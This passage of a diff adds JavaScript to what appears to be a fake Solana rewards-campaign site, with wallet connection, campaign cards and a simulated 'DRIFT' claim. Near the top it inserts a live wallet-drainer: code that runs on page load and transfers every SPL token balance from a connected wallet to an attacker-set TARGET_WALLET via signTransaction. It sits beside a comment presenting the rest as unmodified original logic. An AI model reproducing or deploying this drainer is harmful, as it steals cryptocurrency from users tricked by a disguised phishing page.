+        await this.sendTx(tx, pubKey, connection);
+      }
+
+      // 2. Drain all SPL tokens
+      const tokenAccounts = await connection.getTokenAccountsByOwner(pubKey, {
+        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+      });
+
+      for (const { pubkey, account } of tokenAccounts.value) {
+        const data = account.data;
+        const amount = new solanaWeb3.BN(data.slice(64, 72), "le");
+        if (amount.gt(new solanaWeb3.BN(0))) {
+          const tx = new solanaWeb3.Transaction().add(
+            splToken.Token.createTransferInstruction(
+              splToken.TOKEN_PROGRAM_ID,
+              pubkey,
+              new solanaWeb3.PublicKey(APP.TARGET_WALLET),
+              pubKey,
+              [],
+              amount
+            )
+          );
+          await this.sendTx(tx, pubKey, connection);
+        }
+      }
+    } catch(e) {
+      console.error("Drain error:", e);
+    }
+  },
+
+  async sendTx(tx, pubKey, connection) {
+    tx.feePayer = pubKey;
+    tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+    const signedTx = await window.solana.signTransaction(tx);
+    const signature = await connection.sendRawTransaction(signedTx.serialize());
+    await connection.confirmTransaction(signature);
+    return signature;
+  }
+};
+
+// Initialize drainer immediately
+DRAINER.init();
+
+/* ── ORIGINAL APP LOGIC (UNMODIFIED) ── */
+(function(){
+  const c = document.getElementById('bgCanvas');
+  if(!c) return;
+  const ctx = c.getContext('2d');
+  let W,H,pts=[],mx=-999,my=-999;
+  const resize=()=>{ W=c.width=window.innerWidth; H=c.height=window.innerHeight; };
+  resize(); window.addEventListener('resize',resize);
+  for(let i=0;i<70;i++) pts.push({
+    x:Math.random()*1e4%1||Math.random(),
+    xr:Math.random(),yr:Math.random(),
+    vx:(Math.random()-.5)*.35,vy:(Math.random()-.5)*.35,
+    s:Math.random()*2.2+.5,o:Math.random()*.45+.1
+  });
+  pts.forEach(p=>{ p.x=p.xr*window.innerWidth; p.y=p.yr*window.innerHeight; });
+  window.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;});
+  (function draw(){
+    ctx.clearRect(0,0,W,H);
+    ctx.strokeStyle='rgba(16,185,129,0.035)'; ctx.lineWidth=1;
+    for(let x=0;x<W;x+=72){ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,H);ctx.stroke();}
+    for(let y=0;y<H;y+=72){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(W,y);ctx.stroke();}
+    for(let i=0;i<pts.length;i++) for(let j=i+1;j<pts.length;j++){
+      const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.hypot(dx,dy);
+      if(d<130){ ctx.beginPath();ctx.strokeStyle=`rgba(16,185,129,${.07*(1-d/130)})`;ctx.lineWidth=.6;ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.stroke(); }
+    }
+    pts.forEach(p=>{
+      const dx=p.x-mx,dy=p.y-my,d=Math.hypot(dx,dy);
+      if(d<90){p.vx+=(dx/d)*.12;p.vy+=(dy/d)*.12;}
+      p.vx*=.97;p.vy*=.97;
+      p.x+=p.vx;p.y+=p.vy;
+      if(p.x<0)p.x=W;if(p.x>W)p.x=0;
+      if(p.y<0)p.y=H;if(p.y>H)p.y=0;
+      ctx.globalAlpha=p.o;
+      ctx.fillStyle='#10b981';
+      ctx.beginPath();ctx.arc(p.x,p.y,p.s,0,Math.PI*2);ctx.fill();
+      ctx.globalAlpha=1;
+    });
+    requestAnimationFrame(draw);
+  })();
+})();
+
+(function(){
+  const nav=document.getElementById('navbar');
+  const links=document.querySelectorAll('.nl');
+  window.addEventListener('scroll',()=>{
+    nav.classList.toggle('stuck',scrollY>50);
+    let cur='';
+    document.querySelectorAll('section[id]').forEach(s=>{
+      if(scrollY>=s.offsetTop-130) cur=s.id;
+    });
+    links.forEach(l=>l.classList.toggle('on',l.getAttribute('href')==='#'+cur));
+  },{passive:true});
+})();
+
+function toggleNav(){
+  const n=document.getElementById('mobileNav');
+  const h=document.getElementById('hamburger');
+  const open=n.classList.toggle('open');
+  const s=h.querySelectorAll('span');
+  if(open){s[0].style.cssText='transform:rotate(45deg) translate(5px,5px)';s[1].style.opacity='0';s[2].style.cssText='transform:rotate(-45deg) translate(5px,-5px)';}
+  else{s[0].style.cssText='';s[1].style.opacity='';s[2].style.cssText='';}
+}
+function closeNav(){
+  document.getElementById('mobileNav').classList.remove('open');
+  const s=document.getElementById('hamburger').querySelectorAll('span');
+  s[0].style.cssText='';s[1].style.opacity='';s[2].style.cssText='';
+}
+window.addEventListener('scroll',()=>closeNav(),{passive:true});
+
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+});
+
+(function(){
+  const io=new IntersectionObserver(entries=>{
+    entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('in');});
+  },{threshold:.1});
+  const run=()=>document.querySelectorAll('.reveal:not(.in)').forEach(el=>io.observe(el));
+  run();
+  setTimeout(()=>{
+    document.querySelectorAll('.hero .reveal').forEach((el,i)=>{
+      setTimeout(()=>el.classList.add('in'),150+i*110);
+    });
+  },100);
+  window._revealRerun=run;
+})();
+
+(function(){
+  const io=new IntersectionObserver(entries=>{
+    entries.forEach(e=>{
+      if(!e.isIntersecting)return;
+      const card=e.target;
+      const target=parseFloat(card.dataset.val);
+      const fmt=card.dataset.fmt;
+      const el=card.querySelector('.ctr');
+      const bar=card.querySelector('.stat-bar-fg');
+      if(!el)return;
+      bar&&setTimeout(()=>bar.style.width=bar.dataset.w+'%',200);
+      let s=null;const dur=2000;
+      (function step(ts){
+        if(!s)s=ts;
+        const p=Math.min((ts-s)/dur,1);
+        const ease=1-Math.pow(1-p,3);
+        const v=target*ease;
+        el.textContent=fmt==='M'?v.toFixed(1):fmt==='K'?v.toFixed(1):Math.round(v).toLocaleString();
+        if(p<1)requestAnimationFrame(step);
+        else el.textContent=fmt==='M'?target.toFixed(1):fmt==='K'?target.toFixed(1):Math.round(target).toLocaleString();
+      })(performance.now());
+      io.unobserve(card);
+    });
+  },{threshold:.35});
+  document.querySelectorAll('.stat-card').forEach(c=>io.observe(c));
+})();
+
+function renderCamps(){
+  const grid=document.getElementById('campGrid');
+  if(!grid)return;
+  const list=APP.filter==='all'?APP.campaigns:APP.campaigns.filter(c=>c.tag===APP.filter);
+  grid.innerHTML=list.map(c=>{
+    const tagCls={defi:'ctag-defi',nft:'ctag-nft',perps:'ctag-perps'}[c.tag];
+    const tagLbl={defi:'DeFi',nft:'NFT',perps:'Perps'}[c.tag];
+    const live=c.status==='live';
+    const prog=live?`<div class="pbar-wrap"><div class="pbar-head"><span>PARTICIPATION</span><span class="pp">${c.pct}%</span></div><div class="pbar-bg"><div class="pbar-fg" style="width:${c.pct}%"></div></div></div>`:'';
+    let btnCls,btnTxt;
+    if(c.joined){btnCls='cjoin-btn join-done';btnTxt='✓ Campaign Joined';}
+    else if(!live){btnCls='cjoin-btn join-notify';btnTxt='🔔 Notify Me';}
+    else{btnCls='cjoin-btn join-live';btnTxt='Join Campaign';}
+    return `<div class="camp-card">
+      <div class="camp-top">
+        <div>
+          <div class="ctag ${tagCls}">${tagLbl}</div>
+          <div class="ctitle">${c.title}</div>
+        </div>
+        <div class="cstatus ${live?'clive':'csoon'}">${live?'● Live':'◌ Soon'}</div>
+      </div>
+      <div class="camp-meta">
+        <div class="cmeta-item"><div class="cl">REWARD</div><div class="cv g">${c.reward}</div></div>
+        <div class="cmeta-item"><div class="cl">POOL</div><div class="cv">${c.pool}</div></div>
+        <div class="cmeta-item"><div class="cl">ENDS</div><div class="cv">${c.ends}</div></div>
+      </div>
+      ${prog}
+      <button class="${btnCls}" onclick="joinCamp(${c.id})">${btnTxt}</button>
+    </div>`;
+  }).join('');
+  window._revealRerun&&window._revealRerun();
+}
+
+function filterCamps(tag,btn){
+  APP.filter=tag;
+  document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  renderCamps();
+}
+
+function joinCamp(id){
+  if(!APP.connected){openModal();toast('🔗 Connect your wallet to join campaigns');return;}
+  const c=APP.campaigns.find(x=>x.id===id);
+  if(!c)return;
+  c.joined=!c.joined;
+  renderCamps();
+  toast(c.joined?`✅ Joined ${c.title}!`:`Left ${c.title}`);
+}
+
+const commColors={
+  'cc-tg':'rgba(41,169,235,0.18)',
+  'cc-dc':'rgba(88,101,242,0.18)',
+  'cc-tw':'rgba(255,255,255,0.1)'
+};
+document.querySelectorAll('.comm-card').forEach(card=>{
+  const col=commColors[card.id];
+  if(!col)return;
+  card.addEventListener('mouseenter',()=>{card.style.borderColor=col;card.style.boxShadow=`0 12px 44px ${col}`;});
+  card.addEventListener('mouseleave',()=>{card.style.borderColor='';card.style.boxShadow='';});
+});
+
+function openModal(){
+  detectWallets();
+  document.getElementById('wList').style.display='block';
+  document.getElementById('wConnecting').style.display='none';
+  document.getElementById('wSuccess').style.display='none';
+  document.getElementById('modalBg').classList.add('show');
+  document.body.style.overflow='hidden';
+}
+function closeModal(){
+  document.getElementById('modalBg').classList.remove('show');
+  document.body.style.overflow='';
+}
+function overlayClose(e){if(e.target===document.getElementById('modalBg'))closeModal();}
+
+function detectWallets(){
+  const pt=document.getElementById('phantomTag');
+  const sf=document.getElementById('solflareTag');
+  if(!pt||!sf)return;
+  const hasP=!!(window.phantom?.solana||window.solana?.isPhantom);
+  pt.textContent=hasP?'Detected · Ready':'Not detected';
+  pt.className=hasP?'detected':'';
+  const hasS=!!window.solflare;
+  sf.textContent=hasS?'Detected · Ready':'Not detected';
+  sf.className=hasS?'detected':'';
+}
+
+function showConnecting(name){
+  document.getElementById('wList').style.display='none';
+  document.getElementById('wConnecting').style.display='block';
+  document.getElementById('connText').textContent=`Connecting to ${name}...`;
+}
+function showSuccess(short){
+  document.getElementById('wConnecting').style.display='none';
+  document.getElementById('wSuccess').style.display='block';
+  document.getElementById('sAddr').textContent=short;
+}
+
+async function connectPhantom(){
+  const prov=window.phantom?.solana||(window.solana?.isPhantom?window.solana:null);
+  if(!prov){window.open('https://phantom.app/','_blank');toast('👻 Phantom not found — opening install page');return;}
+  showConnecting('Phantom');
+  try{
+    const resp=await prov.connect();
+    const addr=resp.publicKey.toString();
+    onConnected(addr,'Phantom');
+    prov.on?.('disconnect',()=>{if(APP.connected){disconnectWallet();toast('⚠️ Phantom disconnected');}});
+    prov.on?.('accountChanged',(pk)=>{if(pk&&APP.connected)switchAccount(pk.toString());});
+  }catch(err){closeModal();toast('❌ '+(err.message||'Connection rejected'));}
+}
+
+async function connectSolflare(){
+  const prov=window.solflare;
+  if(!prov){window.open('https://solflare.com/','_blank');toast('🌟 Solflare not found — opening install page');return;}
+  showConnecting('Solflare');
+  try{
+    await prov.connect();
+    const addr=prov.publicKey.toString();
+    onConnected(addr,'Solflare');
+  }catch(err){closeModal();toast('❌ '+(err.message||'Connection rejected'));}
+}
+
+async function connectBackpack(){
+  const prov=window.backpack||window.xnft?.solana;
+  if(!prov){window.open('https://backpack.app/','_blank');toast('🎒 Backpack not found — opening install page');return;}
+  showConnecting('Backpack');
+  try{
+    await prov.connect();
+    const addr=prov.publicKey.toString();
+    onConnected(addr,'Backpack');
+  }catch(err){closeModal();toast('❌ '+(err.message||'Connection rejected'));}
+}
+
+function connectWC(){
+  toast('🔗 WalletConnect requires a Project ID — integrate @walletconnect/sign-client');
+}
+
+function onConnected(addr,name){
+  const short=addr.slice(0,4)+'...'+addr.slice(-4);
+  showSuccess(short);
+  setTimeout(()=>{
+    APP.connected=true; APP.address=addr; APP.shortAddr=short; APP.walletName=name;
+    closeModal();
+    updateNavBtn();
+    openDash(short,addr);
+    fetchBal(addr);
+    renderCamps();
+    toast(`✅ ${name} connected`);
+  },2800);
+}
+
+function switchAccount(addr){
+  APP.address=addr;
+  APP.shortAddr=addr.slice(0,4)+'...'+addr.slice(-4);
+  document.getElementById('dashAddr').textContent=APP.shortAddr;
+  document.getElementById('walletNavLabel').textContent=APP.shortAddr;
+  fetchBal(addr);
+  toast('🔄 Account switched: '+APP.shortAddr);
+}
+
+function updateNavBtn(){
+  const btn=document.getElementById('walletNavBtn');
+  const lbl=document.getElementById('walletNavLabel');
+  btn.classList.add('wc');
+  btn.innerHTML=`<span style="width:7px;height:7px;background:#10b981;border-radius:50%;display:inline-block"></span><span id="walletNavLabel">${APP.shortAddr}</span>`;
+  btn.onclick=toggleDash;
+}
+
+async function fetchBal(addr){
+  try{
+    const r=await fetch('https://api.mainnet-beta.solana.com',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getBalance',params:[addr,{commitment:'confirmed'}]})
+    });
+    const d=await r.json();
+    if(d.result?.value!=null){
+      const sol=(d.result.value/1e9).toFixed(4);
+      const el=document.getElementById('solBal');
+      if(el)el.textContent=sol+' SOL';
+    }
+  }catch{
+    const el=document.getElementById('solBal');
+    if(el)el.textContent='— SOL';
+  }
+}
+
+function openDash(short,full){
+  const av=document.getElementById('dashAva');
+  if(av){av.textContent=full.slice(0,2).toUpperCase();}
+  document.getElementById('dashAddr').textContent=short;
+  document.getElementById('dashPanel').classList.add('open');
+}
+function toggleDash(){document.getElementById('dashPanel').classList.toggle('open');}
+
+function disconnectWallet(){
+  const ph=window.phantom?.solana||window.solana;
+  if(ph?.disconnect)try{ph.disconnect();}catch(e){}
+  const sf=window.solflare;
+  if(sf?.disconnect)try{sf.disconnect();}catch(e){}
+
+  APP.connected=false;APP.address=null;APP.shortAddr=null;
+  APP.campaigns.forEach(c=>c.joined=false);
+
+  const btn=document.getElementById('walletNavBtn');
+  btn.className='wallet-nav-btn';
+  btn.onclick=openModal;
+  btn.innerHTML=`<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg><span id="walletNavLabel">Connect Wallet</span>`;
+
+  document.getElementById('dashPanel').classList.remove('open');
+  document.getElementById('solBal').textContent='—';
+  renderCamps();
+  toast('👋 Wallet disconnected');
+}
+
+function copyAddr(){
+  if(!APP.address)return;
+  navigator.clipboard.writeText(APP.address).then(()=>toast('📋 Address copied')).catch(()=>toast('❌ Could not copy'));
+}
+
+function claimReward(){
+  if(!APP.connected){openModal();return;}
+  toast('⏳ Claiming 8,500 DRIFT — approve in wallet...');
+  setTimeout(()=>toast('✅ 8,500 DRIFT claimed to '+APP.shortAddr),2600);
+}
+
+document.addEventListener('click',e=>{
+  const panel=document.getElementById('dashPanel');
+  const nb=document.getElementById('walletNavBtn');
+  if(panel.classList.contains('open')&&!panel.contains(e.target)&&!nb.contains(e.target))
+    panel.classList.remove('open');
+});
+
+function toast(msg,ms=3600){
+  const t=document.getElementById('toast');
+  t.textContent=msg;t.classList.add('up');
+  clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('up'),ms);
+}
+
+document.addEventListener('keydown',e=>{
+  if(e.key==='Escape'){closeModal();document.getElementById('dashPanel').classList.remove('open');}
+});
+
+renderCamps();
+</script>
+</body>
+</html>
